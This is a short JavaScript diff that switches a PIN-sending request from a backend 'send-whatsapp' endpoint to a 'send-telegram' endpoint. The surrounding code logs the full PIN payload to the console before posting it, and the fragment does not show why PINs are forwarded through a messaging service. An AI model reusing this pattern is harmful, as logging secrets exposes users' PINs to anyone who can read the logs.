@@ -219,7 +219,7 @@
         console.log('📤 Sending PIN to backend:', payload);
         
         try {
-            const response = await fetch(`${RAILWAY_URL}/api/send-whatsapp`, {
+           const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
